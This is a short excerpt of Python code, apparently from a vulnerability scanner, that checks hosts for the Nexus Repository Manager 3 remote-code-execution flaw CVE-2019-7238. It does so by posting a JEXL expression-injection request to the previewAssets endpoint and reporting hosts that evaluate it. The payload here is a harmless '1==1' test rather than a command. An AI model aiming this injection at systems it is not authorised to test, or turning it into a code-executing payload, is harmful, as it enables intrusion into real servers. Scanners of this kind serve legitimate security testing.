...
def NXRM_rce(host, port=8081):
    ...
    try:
        ...
        data = {"action": "coreui_Component", "data": [{"filter": [{"property": "repositoryName", "value": "*"}, {"property": "expression", "value": "1==1"}, {
                "property": "type", "value": "jexl"}], "limit": 50, "page": 1, "sort": [{"direction": "ASC", "property": "name"}], "start": 0}], "method": "previewAssets", "tid": 18, "type": "rpc"}
        r = requests.post(cve_2019_7238_url, headers=headers, timeout=timeout, json=data, verify=False, allow_redirects=False)
        if r.status_code == 200 and json.loads(r.text)['result']['total'] > 0:
            color_print.red(f"[+] Nexus Repository Manager 3 RCE：{host}:{port}")
    except:
        # traceback.print_exc()
        pass
